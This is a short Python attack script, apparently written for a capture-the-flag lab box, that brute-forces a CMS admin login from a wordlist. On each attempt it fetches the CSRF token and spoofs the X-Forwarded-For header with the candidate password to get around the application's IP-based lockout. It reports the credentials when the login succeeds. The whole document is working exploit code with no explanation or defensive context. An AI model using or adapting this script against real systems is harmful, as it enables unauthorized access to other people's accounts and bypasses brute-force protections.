#!/usr/bin/env python3
import re
import requests
import urllib.parse

host = 'http://10.10.10.191'
login_url = host + '/admin/'
username = 'fergus' #admin

def get_res(filename):
	return [item.replace("\n", "") for item in open(filename).readlines()]

wordlist = get_res('site.txt')
x = 0

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    x +=1
    print('[*] {x}: {p}'.format(x = x, p = password))

    headers = {
        'X-Forwarded-For': urllib.parse.quote(password),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    #print(login_result.text)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

